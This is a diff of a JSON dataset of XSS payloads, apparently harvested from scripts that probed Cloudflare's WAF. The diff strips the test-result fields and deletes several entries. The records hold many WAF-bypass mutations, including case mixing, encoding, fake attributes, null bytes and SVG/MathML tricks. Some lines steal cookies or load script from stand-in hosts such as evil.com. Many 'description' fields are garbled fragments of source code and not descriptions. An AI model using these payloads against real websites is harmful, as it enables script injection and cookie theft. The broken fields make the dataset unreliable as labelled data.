       "technique": "encoding",
       "source_file": "waf_round19_github.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0178",
@@ -543,11 +371,7 @@
       "description": "<img src=OnErRor OnErRor=(alert)(\"test",
       "technique": "direct_injection",
       "source_file": "waf_round19_github.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0179",
@@ -557,11 +381,7 @@
       "description": "dup-onfocus-onfocus\": '<input OnFoCuS OnFoCuS=alert(1) autofocus>',\n    \"dup-onclick-onclick\": '<div OnClIcK OnClIcK=alert(1)>click</div>',\n    \"dup-onmouseover2\": '<div OnMoUsEoVeR OnMoUsEoVeR=alert(1)>hover</div>',\n    \n    # First attr as src, second as event (exact HexaPhp)\n    \"dup-src-is-event\": '<img src=onerror onerror=alert(1)>',\n    \"dup-src-is-event2\": '<img SRC=OnErRoR ONERROR=alert(1)>',\n    \"dup-href-onclick\": '<a href=onclick onclick=alert(1)>click</a>',\n    \n    # Attribute name IS the event handler name used as value\n    \"dup-val-event\": '<img onerror=src onerror=alert(1)>',\n    \n    # Space/tab between duplicates\n    \"dup-tab\": '<img\\tsrc=OnErRor\\tOnErRor=(alert)(1)>',\n    \"dup-newline\": '<img\\nsrc=OnErRor\\nOnErRor=(alert)(1)>',\n    \n    # With Only= prefix (known CF bypass pattern)\n    \"dup-only-onerror\": '<img Only=1 src=OnErRor OnErRor=(alert)(1)>',\n    \"dup-only-onload\": '<svg Only=1 OnLoAd OnLoAd=alert(1)>',\n    \n    # With oni= prefix\n    \"dup-oni-onerror\": '<img oni=on src=OnErRor OnErRor=(alert)(1)>',\n    \n    # Triple duplicate\n    \"dup-triple\": '<img OnErRor=x OnErRor=y OnErRor=(alert)(1)>',\n    \n    # Encoded first onerror\n    \"dup-enc-first\": '<img %6f%6e%65%72%72%6f%72=x OnErRor=(alert)(1) src=x>',\n    \n    # Different functions\n    \"dup-fetch\": '<img src=OnErRor OnErRor=fetch(\"//x",
       "technique": "encoding",
       "source_file": "waf_round19_github.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0181",
@@ -571,25 +391,7 @@
       "description": "<svg onload=confirm`1`>',\n    '<svg onload=prompt`1`>',\n    '<img src=x onerror=alert`1`>',\n    '<img src=x onerror=.1|alert``>',\n    '<img src=x onerror=throw/a]alert/**/(1)>',\n    '<svg onload=import`//evil.com`>',\n    # onerror with throw\n    '<img src=x onerror=throw/**/onerror=alert,1>',\n    '<script>throw/a]alert/**/\\x281\\x29</script>',\n    '<script>onerror=alert;throw 1</script>',\n    '<script>{onerror=alert}throw 1</script>',\n    '<script>onerror=eval;throw\"=alert\\\\x281\\\\x29\"</script>',\n    # location assignment\n    '<script>location=name</script>',\n    '<script>location=`javascript:alert\\\\x281\\\\x29`</script>',\n    # Without parens using tagged templates\n    '<script>alert`document.domain`</script>',\n    '<script>Function`a]return+alert\\\\x281\\\\x29}`</script>',\n    '<script>[].find`alert`</script>',\n    '<script>[1].map`alert`</script>',\n    '<script>[1].every`alert`</script>',\n    '<script>[1].filter`alert`</script>',\n    '<script>[1].findIndex`alert`</script>',\n]\n\n# XSS without quotes\nNO_QUOTES = [\n    '<svg onload=alert(1)>',\n    '<img src=x onerror=alert(1)>',\n    '<script>alert(1)</script>',\n    '<svg onload=alert(String.fromCharCode(88,83,83))>',\n    '<img src=x onerror=alert(/XSS/.source)>',\n    '<script>eval(atob(/YWxlcnQoMSk/.source))</script>',\n]\n\n# XSS without spaces\nNO_SPACES = [\n    '<svg/onload=alert(1)>',\n    '<img/src=x/onerror=alert(1)>',\n    '<svg\\tonload=alert(1)>',\n    '<svg\\nonload=alert(1)>',\n    '<svg\\ronload=alert(1)>',\n    '<svg\\x0conload=alert(1)>',\n    '<svg\\x0bonload=alert(1)>',\n    '<img/src/onerror=alert(1)>',\n]\n\n# XSS without angle brackets\nNO_ANGLES = [\n    \"javascript:alert(1)\",\n    \"';alert(1);//\",\n    '\";alert(1);//',\n    \"'-alert(1)-'\",\n    '\"-alert(1)-\"',\n    \"`${alert(1)}`\",\n    \"eval('alert(1)",
       "technique": "direct_injection",
       "source_file": "waf_round97_portswigger2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0212",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "<svg/onload=alert(1)>",
-      "description": "<svg onload=alert(1)>',\n    '<img src=x onerror=alert(1)>',\n    '<img/src=x onerror=alert(1)>',\n    '<input onfocus=alert(1) autofocus>',\n    '<input/onfocus=alert(1)/autofocus>',\n    '<body onload=alert(1)>',\n    '<details open ontoggle=alert(1)>',\n    '<marquee onstart=alert(1)>',\n    '<video src=x onerror=alert(1)>',\n    '<audio src=x onerror=alert(1)>',\n    '<iframe src=\"javascript:alert(1)\">',\n    '<iframe onload=alert(1)>',\n    '<object data=\"javascript:alert(1)\">',\n    '<embed src=\"javascript:alert(1)\">',\n    '<a href=\"javascript:alert(1)\">click</a>',\n    '<form action=\"javascript:alert(1)\"><input type=submit>',\n    '<script>alert(1)</script>',\n    '<script src=\"//evil\"></script>',\n    '<svg><script>alert(1)</script></svg>',\n    '<math><mtext><script>alert(1)</script></mtext></math>',\n    '\"><svg/onload=alert(1)>',\n    \"'><svg/onload=alert(1)>\",\n    '\"><img src=x onerror=alert(1)>',\n    '\"><script>alert(1)</script>',\n    '\" onfocus=alert(1) autofocus x=\"',\n    \"' onfocus=alert(1) autofocus x='\",\n    '\" onmouseover=alert(1) x=\"',\n    '\" onclick=alert(1) x=\"',\n    '\" onload=alert(1) x=\"',\n    '<svg/onload=alert`1`>',\n    '<img src=x onerror=alert`1`>',\n    '<svg/onload=confirm(1)>',\n    '<svg/onload=prompt(1)>',\n    '<svg/onload=print()>',\n    '<img src=x onerror=confirm(1)>',\n    '<img src=x onerror=prompt(1)>',\n    '<svg/onload=alert(document.domain)>',\n    '<svg/onload=alert(document.cookie)>',\n    '<img src=x onerror=eval(atob(\"YWxlcnQoMSk=",
-      "technique": "direct_injection",
-      "source_file": "waf_round68_mass.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0219",
@@ -599,11 +401,7 @@
       "description": "<SVG/ONLOAD=alert(1)>', '<sVg/OnLoAd=alert(1)>',\n    '<svg /onload=alert(1)>', '<svg  /onload=alert(1)>', '<svg\\t/onload=alert(1)>',\n    '<svg/onload =alert(1)>', '<svg/onload= alert(1)>', '<svg/onload=alert (1)>',\n    '<svg/onload=alert( 1)>', '<svg/onload=alert(1 )>', '<svg/onload=alert(1)  >',\n    '<svg/ONLOAD=alert(1)>', '<svg/onLoad=alert(1)>', '<svg/OnLoad=alert(1)>',\n    '<svg/onload=alert(1)/>', '<svg/onload=alert(1) />', '<svg onload=alert(1)//>',\n    '<svg\\x0conload=alert(1)>', '<svg\\x09onload=alert(1)>', '<svg\\x0aonload=alert(1)>',\n    '<svg\\x0donload=alert(1)>',\n    '<svg/onload=alert(1)>', '<svg /onload=alert(1)>',\n    '< svg/onload=alert(1)>', '<svg/ onload=alert(1)>',\n    '<svg/onload=alert(+1)>', '<svg/onload=alert(-1)>', '<svg/onload=alert(~1)>',\n    '<svg/onload=alert(!1)>', '<svg/onload=alert(void 0)>',\n    '<svg/onload=alert(1,2)>', '<svg/onload=alert(1);>',\n    '<svg/onload=alert(1)//>', '<svg/onload=alert(1)/**//>',\n]\n\nimg_mutations = [\n    '<img src=x onerror=alert(1)>', '<img/src=x/onerror=alert(1)>',\n    '<IMG SRC=x ONERROR=alert(1)>', '<ImG sRc=x OnErRoR=alert(1)>',\n    '<img src=\"x\" onerror=\"alert(1)\">', \"<img src='x' onerror='alert(1)'>\",\n    '<img src=x onerror=alert(1) />', '<img src=x onerror=alert(1)///>',\n    '<img src=xx onerror=alert(1)>', '<img src=. onerror=alert(1)>',\n    '<img src=/ onerror=alert(1)>', '<img src=// onerror=alert(1)>',\n    '<img src=1 onerror=alert(1)>', '<img src=\"\" onerror=alert(1)>',\n    '<img src onerror=alert(1)>', '<img/src/onerror=alert(1)>',\n    '<img src=x\\tonerror=alert(1)>', '<img src=x\\nonerror=alert(1)>',\n    '<img src=x\\ronerror=alert(1)>',\n]\n\nscript_mutations = [\n    '<script>alert(1)</script>', '<SCRIPT>alert(1)</SCRIPT>',\n    '<Script>alert(1)</Script>', '<sCrIpT>alert(1)</ScRiPt>',\n    '<script >alert(1)</script>', '<script\\t>alert(1)</script>',\n    '<script\\n>alert(1)</script>', '<script\\r>alert(1)</script>',\n    '<script/>alert(1)</script>', '<script >alert(1)</script >',\n    '<scr\\x00ipt>alert(1)</script>', '<scri\\x00pt>alert(1)</script>',\n]\n\n# Additional creative mutations\ncreative_mutations = [\n    # Null bytes inside tags\n    '<sv\\x00g/onload=alert(1)>', '<im\\x00g src=x onerror=alert(1)>',\n    # Comment injection\n    '<svg/on<!---->load=alert(1)>', '<img src=x on<!---->error=alert(1)>',\n    # Backtick variations\n    '<svg/onload=alert`1`>', '<img src=x onerror=alert`1`>',\n    '<svg/onload=confirm`1`>', '<svg/onload=prompt`1`>',\n    # Template literals\n    '<svg/onload=alert`${1}`>', '<svg/onload=${alert(1)}>',\n    # Object/array tricks\n    '<svg/onload=[alert(1)]>', '<svg/onload={alert:alert(1)}>',\n    # Comma operator\n    '<svg/onload=1,alert(1)>', '<svg/onload=void(alert(1))>',\n    # Arrow functions\n    '<svg/onload=(()=>alert(1))()>', '<svg/onload=(x=>alert(1))()>',\n    # With\n    '<svg/onload=with(document)alert(1)>',\n    # Various quote escapes\n    '\"><svg/onload=alert(1)><\"', \"'><svg/onload=alert(1)><'\",\n    '``><svg/onload=alert(1)>', '//><svg/onload=alert(1)>',\n]\n\nall_mutations = svg_mutations + img_mutations + script_mutations + creative_mutations\n\nfor payload in all_mutations:\n    enc = urllib.parse.quote(payload)\n    # GET\n    s, b, x, sn = test_get(f\"globalHtml={enc}",
       "technique": "mutation",
       "source_file": "waf_round68_mass.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0225",
@@ -613,11 +411,7 @@
       "description": "POST",
       "technique": "direct_injection",
       "source_file": "waf_round44_browser_quirk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0233",
@@ -627,25 +421,7 @@
       "description": "JSON",
       "technique": "direct_injection",
       "source_file": "waf_round44_browser_quirk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0236",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "\"/><svg on{load=alert(1)>",
-      "description": "GET",
-      "technique": "direct_injection",
-      "source_file": "waf_round44_browser_quirk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0238",
@@ -655,11 +431,7 @@
       "description": "POST",
       "technique": "direct_injection",
       "source_file": "waf_round44_browser_quirk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0239",
@@ -669,11 +441,7 @@
       "description": "POST",
       "technique": "direct_injection",
       "source_file": "waf_round44_browser_quirk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0248",
@@ -683,11 +451,7 @@
       "description": "JSON",
       "technique": "direct_injection",
       "source_file": "waf_round44_browser_quirk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0267",
@@ -697,11 +461,7 @@
       "description": "math-on`load\": '<math on`load=alert(1)>x</math>',\n    \"svg-on{load\": '<svg on{load=alert(1)></svg>',\n    \"svg-on`load\": '<svg on`load=alert(1)></svg>',\n    # SVG with namespace declaration\n    \"svg-ns-on{load\": '<svg xmlns=\"http://www.w3.org/2000/svg\" on{load=alert(1)></svg>',\n    # MathML with HTML embedding\n    \"math-mtext-on{load\": '<math><mtext on{load=alert(1)>x</mtext></math>',\n    \"math-mi-on{focus\": '<math><mi on{focus=alert(1) tabindex=1>x</mi></math>',\n    # foreignObject\n    \"svg-fo-on{load\": '<svg><foreignObject on{load=alert(1)>x</foreignObject></svg>',\n}\n\nfor name, payload in ns_gap.items():\n    t(f\"{name}-POST\", {\"globalHtml\": payload}, method=\"POST",
       "technique": "direct_injection",
       "source_file": "waf_round44_browser_quirk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0269",
@@ -711,11 +471,7 @@
       "description": "attributeHtml\", \"POST",
       "technique": "direct_injection",
       "source_file": "waf_round44_browser_quirk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0278",
@@ -725,11 +481,7 @@
       "description": "<svg/onload=eval(location.hash.slice(1))>',\n    '<svg/onload=eval(window.name)>',\n    '<svg/onload=eval(document.referrer)>',\n    '<svg/onload=fetch(name)>',\n    '<svg/onload=import(name)>',\n    '<img src=x onerror=eval(name)>',\n    '<img src=x onerror=eval(location.hash.slice(1))>',\n    '<img src=x onerror=with(document)write(cookie)>',\n    '<img src=x onerror=document.location=name>',\n    '<svg/onload=location=name>',\n    '<svg/onload=location.assign(name)>',\n    '<svg/onload=open(name)>',\n    '<svg/onload=navigator.sendBeacon(name,document.cookie)>',\n]\n\nfor p in C_PAYLOADS:\n    test(p)\nprint(f\"  Window.name done: {total} total",
       "technique": "direct_injection",
       "source_file": "waf_round74_oss4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0279",
@@ -739,11 +491,7 @@
       "description": "<svg><use xlink:href=\"data:image/svg+xml,<svg onload=alert(1)>\">',\n    '<svg><set onbegin=alert(1) attributeName=x to=y>',\n    '<svg><animateMotion onbegin=alert(1)><mpath href=/>',\n    '<svg><discard onbegin=alert(1)>',\n    '<svg><animate values=0;1 dur=1s onend=alert(1) attributeName=x>',\n    '<svg><handler type=\"text/javascript\">alert(1)</handler></svg>',\n    '<svg><script type=\"text/ecmascript\">alert(1)</script></svg>',\n    '<svg><foreignObject requiredExtensions=\"\"><body onload=alert(1)></foreignObject></svg>',\n    '<svg viewBox=\"0 0 1 1\"><a href=\"javascript:alert(1)\"><rect width=1 height=1/></a></svg>',\n]\n\nfor p in E_PAYLOADS:\n    test(p)\nprint(f\"  SVG deep done: {total} total",
       "technique": "direct_injection",
       "source_file": "waf_round74_oss4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0290",
@@ -753,39 +501,7 @@
       "description": "<img src=x onerror=alert(1)>',\n    '<script>alert(1)</script>',\n]\n\nfor p in PAYLOADS_RAW:\n    # Single URL encode\n    e1 = urllib.parse.quote(p, safe='",
       "technique": "encoding",
       "source_file": "waf_round92_research2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0291",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "<svg/onload=alert(1)>",
-      "description": "<img src=x onerror=alert(1)>',\n    '<script>alert(1)</script>',\n]\n\nfor p in NORM_PAYLOADS:\n    # Full fullwidth conversion\n    fw = ''.join(FULLWIDTH_MAP.get(c, c) for c in p)\n    get(fw, label=\"nfkc-full",
-      "technique": "direct_injection",
-      "source_file": "waf_round92_research2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0292",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "<svg/onload=alert(1)>",
-      "description": "<img src=x onerror=alert(1)>",
-      "technique": "direct_injection",
-      "source_file": "waf_round92_research2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0297",
@@ -795,11 +511,7 @@
       "description": "<svg onx=() onload=window.alert?.()>',\n    '<img oNLy=1 src=x oNErrOR=prompt`1`//>',\n    '<img//////src=x oNlY=1 oNerror=alert(\"xss",
       "technique": "direct_injection",
       "source_file": "waf_round92_research2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0307",
@@ -809,25 +521,7 @@
       "description": "<svg onx=() onload=window.alert?.()>',\n    '<img oNLy=1 src=x oNErrOR=prompt`1`//>',\n    '<img//////src=x oNlY=1 oNerror=alert(\"xss",
       "technique": "direct_injection",
       "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0309",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "<svg onload=alert(1)>",
-      "description": "<img src=x onerror=alert(1)>',\n    '<details open ontoggle=alert(1)>',\n    \"<script>window['ale'+'rt",
-      "technique": "direct_injection",
-      "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0320",
@@ -837,11 +531,7 @@
       "description": "<img src=x onerror=\"PAYLOAD\">',\n    '<details/open/ontoggle=\"PAYLOAD\">',\n    '<body/onload=\"PAYLOAD\">',\n]\n\ncount_d = 0\nfor d in DESTRUCT:\n    for w in DESTRUCT_WRAPPERS:\n        p = w.replace('PAYLOAD', d)\n        get(p)\n        count_d += 1\n\n# Also as javascript: URIs\nfor d in DESTRUCT[:10]:\n    test(f'<a href=\"javascript:{urllib.parse.quote(d)}\">click</a>",
       "technique": "direct_injection",
       "source_file": "waf_round76_cross2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0321",
@@ -851,11 +541,7 @@
       "description": "<img src=x onerror=[][\"filter",
       "technique": "direct_injection",
       "source_file": "waf_round76_cross2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0326",
@@ -865,11 +551,7 @@
       "description": "xib-post-oni-confirm\": 'cccc\" oni=on onclick=confirm(1) dddd',\n    \"xib-post-oni-onfocus\": 'cccc\" oni=on onfocus=print() dddd',\n    \"xib-post-only-onclick\": 'cccc\" Only=1 onclick=print() dddd',\n    # In attributeHtml param via POST\n    \"xib-post-attr-oni\": {\"attributeHtml\": '\" oni=on onclick=print() x=\"'},\n    \"xib-post-attr-only\": {\"attributeHtml\": '\" Only=1 onclick=print() x=\"'},\n    # In globalHtml via POST\n    \"xib-post-html-svg-oni\": {\"globalHtml\": '<svg/oni=on onload=confirm(2)>'},\n    \"xib-post-html-svg-only\": {\"globalHtml\": '<Svg Only=1 OnLoad=confirm(1)>'},\n    \"xib-post-html-o-ondrag\": {\"globalHtml\": '<o oni=on ondrag=alert(1)>Drag Me'},\n}\n\nfor name, payload in xib3r_post.items():\n    if isinstance(payload, dict):\n        test(name, payload, method=\"POST",
       "technique": "direct_injection",
       "source_file": "waf_round20_xib3r.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0327",
@@ -879,11 +561,7 @@
       "description": "oni-svg-confirm\": '<svg/oni=on onload=confirm(1)>',\n    \"oni-img-onerror\": '<img oni=on src=x onerror=alert(1)>',\n    \"oni-input-onfocus\": '<input oni=on onfocus=alert(1) autofocus>',\n    \"oni-body-onload\": '<body oni=on onload=alert(1)>',\n    \"oni-div-onclick\": '<div oni=on onclick=alert(1)>click</div>',\n    \"oni-details-ontoggle\": '<details oni=on open ontoggle=alert(1)>',\n    \n    # Different fake attribute names\n    \"onx-svg-onload\": '<svg onx=on onload=alert(1)>',\n    \"ony-svg-onload\": '<svg ony=on onload=alert(1)>',\n    \"onz-svg-onload\": '<svg onz=on onload=alert(1)>',\n    \"onabc-svg-onload\": '<svg onabc=on onload=alert(1)>',\n    \"on-svg-onload\": '<svg on=on onload=alert(1)>',\n    \"oni-on-svg-onload\": '<svg oni=on on=on onload=alert(1)>',\n    \n    # Fake attr = different values\n    \"oni-1-svg\": '<svg oni=1 onload=alert(1)>',\n    \"oni-empty-svg\": '<svg oni=\"\" onload=alert(1)>',\n    \"oni-x-svg\": '<svg oni=x onload=alert(1)>',\n    \"oni-true-svg\": '<svg oni=true onload=alert(1)>',\n    \n    # Slash separator instead of space\n    \"oni-slash-svg\": '<svg/oni=on/onload=alert(1)>',\n    \"oni-slash2\": '<svg/oni=on/onload=confirm(2)>',\n    \n    # Multiple fake attrs\n    \"multi-oni-svg\": '<svg oni=on onx=on ony=on onload=alert(1)>',\n    \n    # With Only=1 combo\n    \"oni-only-svg\": '<svg oni=on Only=1 onload=alert(1)>',\n    \"only-oni-svg\": '<svg Only=1 oni=on onload=alert(1)>',\n    \n    # On math tag\n    \"oni-math-onload\": '<math oni=on onload=alert(1)>',\n    \"oni-math-onclick\": '<math oni=on onclick=alert(1)>x</math>',\n    \"oni-math-onfocus\": '<math oni=on onfocus=alert(1) tabindex=1>x</math>',\n}\n\nfor name, payload in oni_deep.items():\n    test(name, {\"globalHtml\": payload})\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 75)\nprint(\"20E: Deep Only=1 Exploration",
       "technique": "direct_injection",
       "source_file": "waf_round20_xib3r.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0328",
@@ -893,11 +571,7 @@
       "description": "only-img-onerror\": '<Img Only=1 Src=x OnError=alert(1)>',\n    \"only-input-onfocus\": '<Input Only=1 OnFocus=alert(1) autofocus>',\n    \"only-body-onload\": '<Body Only=1 OnLoad=alert(1)>',\n    \"only-details-ontoggle\": '<Details Only=1 open OnToggle=alert(1)>',\n    \"only-div-onclick\": '<Div Only=1 OnClick=alert(1)>click</Div>',\n    \"only-a-onclick\": '<A Only=1 OnClick=alert(1)>click</A>',\n    \n    # Different Only values\n    \"only-0\": '<Svg Only=0 OnLoad=alert(1)>',\n    \"only-true\": '<Svg Only=true OnLoad=alert(1)>',\n    \"only-empty\": '<Svg Only=\"\" OnLoad=alert(1)>',\n    \"only-x\": '<Svg Only=x OnLoad=alert(1)>',\n    \"only-bare\": '<Svg Only OnLoad=alert(1)>',\n    \n    # Mixed case of Only\n    \"ONLY\": '<Svg ONLY=1 OnLoad=alert(1)>',\n    \"only-lower\": '<svg only=1 onload=alert(1)>',\n    \"OnLy\": '<svg OnLy=1 onload=alert(1)>',\n    \n    # Attribute breakout with Only\n    \"only-attr\": {\"attributeHtml\": '\" Only=1 onfocus=alert(1) autofocus x=\"'},\n    \"only-attr-tabindex\": {\"attributeHtml\": '\" Only=1 tabindex=1 onfocus=alert(1) x=\"'},\n    \"only-attr-id\": {\"attributeHtml\": '\" id=x Only=1 tabindex=1 onfocus=alert(1) x=\"'},\n    \"only-sc\": {\"attributeHtml\": '\"/><Svg Only=1 OnLoad=alert(1)'},\n    \"only-sc-img\": {\"attributeHtml\": '\"/><Img Only=1 Src=x OnError=alert(1)'},\n}\n\nfor name, payload in only_deep.items():\n    if isinstance(payload, dict):\n        test(name, payload)\n    else:\n        test(name, {\"globalHtml\": payload})\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 75)\nprint(\"20F: s0md3v Non-Whitespace Filler Technique",
       "technique": "obfuscation",
       "source_file": "waf_round20_xib3r.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0329",
@@ -907,11 +581,7 @@
       "description": "ent-svg-prompt-hex\": '<svg onload=prompt%26%23x000000028;document.cookie)>',\n    \"ent-svg-alert-dec\": '<svg onload=alert%26%230000000040\"1",
       "technique": "direct_injection",
       "source_file": "waf_round20_xib3r.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0330",
@@ -921,11 +591,7 @@
       "description": "oni-onload-x\": '<svg oni=on onload=x>',\n    \"oni-onload-void\": '<svg oni=on onload=void(0)>',\n    \"oni-onload-true\": '<svg oni=on onload=true>',\n    \"oni-onload-empty\": '<svg oni=on onload=\"\">',\n    \"oni-onerror-1\": '<img oni=on src=x onerror=1>',\n    \n    # Only=1 + event=benign_value\n    \"only-onload-1\": '<Svg Only=1 OnLoad=1>',\n    \"only-onload-x\": '<Svg Only=1 OnLoad=x>',\n    \"only-onerror-1\": '<Img Only=1 Src=x OnError=1>',\n    \n    # Via attribute breakout\n    \"attr-oni-onfocus-1\": {\"attributeHtml\": '\" oni=on onfocus=1 autofocus x=\"'},\n    \"attr-only-onfocus-1\": {\"attributeHtml\": '\" Only=1 onfocus=1 autofocus x=\"'},\n    \"attr-oni-onclick-1\": {\"attributeHtml\": '\" oni=on onclick=1 x=\"'},\n    \n    # Check what passes vs what blocks — determine exact regex\n    \"bare-onload-1\": '<svg onload=1>',\n    \"bare-onerror-1\": '<img src=x onerror=1>',\n    \"bare-onfocus-1\": '<input onfocus=1 autofocus>',\n}\n\nfor name, payload in no_func.items():\n    if isinstance(payload, dict):\n        test(name, payload, show=True)\n    else:\n        test(name, {\"globalHtml\": payload}, show=True)\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 75)\nprint(\"ROUND 20 SUMMARY",
       "technique": "direct_injection",
       "source_file": "waf_round20_xib3r.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0332",
@@ -935,11 +601,7 @@
       "description": "\\t', '\\n', '\\r', '\\x0b', '\\x0c', '\\r\\n', '  ', '\\t\\t',\n            ' \\t', '\\t ', '/', '//', ' /', '/ ', '/**/",
       "technique": "direct_injection",
       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0333",
@@ -949,11 +611,7 @@
       "description": "ONLOAD', 'OnLoad', 'oNlOaD', 'Onload', 'onLoad',\n             'ONLoad', 'ONload', 'onLOAD', 'oNLoad",
       "technique": "direct_injection",
       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0334",
@@ -963,11 +621,7 @@
       "description": "href', 'alt', 'title', 'name', 'data', 'value',\n                   'action', 'type', 'class', 'id', 'width', 'height",
       "technique": "direct_injection",
       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0339",
@@ -977,11 +631,7 @@
       "description": "\\t', '\\n', '\\r', '\\x0b', '\\x0c', '  ', '\\t\\t",
       "technique": "direct_injection",
       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0340",
@@ -991,11 +641,7 @@
       "description": "shy",
       "technique": "direct_injection",
       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0341",
@@ -1005,11 +651,7 @@
       "description": "\\t', '\\n', '  ', '\\t ', ' \\t', '/', '\\x0c",
       "technique": "direct_injection",
       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0342",
@@ -1019,11 +661,7 @@
       "description": "<Svg Only=1 OnLoad=confirm(1)>',\n    '<svg on onload=(alert)(1)>',\n    '<img src=OnErRor OnErRor=(alert)(1)>',\n]\n\n# JSON body\nimport json\nfor i, p in enumerate(best_payloads):\n    post_tweaks[f\"json-{i}",
       "technique": "direct_injection",
       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0344",
@@ -1033,11 +671,7 @@
       "description": ">",
       "technique": "direct_injection",
       "source_file": "waf_round90_push.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0354",
@@ -1047,11 +681,7 @@
